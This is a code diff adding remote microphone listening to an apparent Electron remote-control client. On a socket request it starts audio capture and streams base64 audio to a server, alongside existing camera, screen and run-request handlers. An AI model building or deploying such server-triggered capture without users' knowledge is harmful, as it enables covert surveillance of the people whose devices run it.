@@ -21,6 +21,11 @@ class RemoteControl {
       this.mainWindow.webContents.send("camStart", data);
     }, 3000);
   };
+  
+  handleAudioListen = (data) => {
+    console.log({ handleAudioListen: data });
+    this.mainWindow.webContents.send("audioListenStart", data);
+  };
 
   getScreenData = (data) => {
     (async () => {
@@ -69,6 +74,11 @@ class RemoteControl {
     this.socket.on("camShotRequest", (data) => {
       this.getCamDataWeb(data);
     });
+    
+    this.socket.on("audioListenRequest", (data) => {
+      console.log("🎧 Audio listen request received:", data.action);
+      this.handleAudioListen(data);
+    });
 
     ipcMain.on("cam", (event, args) => {
       this.socket.emit("camShotResponse", args);
@@ -77,6 +87,24 @@ class RemoteControl {
     // Binary transfer için yeni handler
     ipcMain.on("camBinary", (event, args) => {
       this.socket.emit("camBinary", args);
+    });
+    
+    // Audio stream için handler
+    ipcMain.on("audioStream", (event, args) => {
+      console.log("📥 Audio stream received from renderer:", args.audioData ? args.audioData.length : "no data", "chars (base64)");
+      console.log("📡 MIME type:", args.mimeType);
+      
+      if (args.audioData && args.audioData.length > 0) {
+        console.log("📤 Forwarding audio data to server");
+        this.socket.emit("audioStreamResponse", args);
+      } else {
+        console.log("⚠️ No audio data to forward");
+      }
+    });
+    
+    // Audio listen status için handler
+    ipcMain.on("audioListenStatus", (event, args) => {
+      this.socket.emit("audioListenStatus", args);
     });
 
     this.socket.on("getRunRequest", (data) => {
